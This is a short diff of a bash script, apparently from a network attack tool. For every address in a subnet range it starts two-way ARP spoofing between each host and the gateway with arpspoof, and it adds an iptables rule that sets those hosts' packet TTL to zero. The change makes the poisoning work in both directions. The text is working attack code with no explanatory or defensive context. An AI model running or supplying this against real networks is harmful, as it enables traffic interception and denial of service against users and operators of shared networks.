@@ -136,7 +136,8 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     END=$(ip2int "$HOSTMAX")
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip "$i")
-        ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
+        ( arpspoof -i "$INTERFACE" -c host -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 ) &
+        ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 ) &
           iptables -t mangle -I PREROUTING -s "$TARGET_IP" -j TTL --ttl-set 0
     done
 fi
